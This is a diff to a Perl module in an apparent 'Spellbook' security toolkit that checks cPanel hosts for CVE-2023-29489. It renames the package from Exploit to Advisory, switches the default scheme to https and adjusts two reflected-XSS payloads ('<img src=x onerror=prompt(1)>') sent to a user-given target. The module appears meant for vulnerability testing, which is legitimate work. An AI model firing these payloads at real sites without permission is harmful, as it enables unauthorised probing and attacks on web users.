@@ -1,4 +1,4 @@
-package Spellbook::Exploit::CVE_2023_29489 {
+package Spellbook::Advisory::CVE_2023_29489 {
     use strict;
     use warnings;
     use LWP::UserAgent;
@@ -15,7 +15,7 @@ package Spellbook::Exploit::CVE_2023_29489 {
 
         if ($target) {    
             if ($target !~ /^http(s)?:\/\//) { 
-                $target = "http://$target";
+                $target = "https://$target";
             }
                     
             my $userAgent = LWP::UserAgent -> new (
@@ -27,8 +27,8 @@ package Spellbook::Exploit::CVE_2023_29489 {
             );
 
             my @payloads = (
-                "cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
-                "<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa"
+                "/cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
+                "/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa"
             );
 
             foreach my $payload (@payloads) {
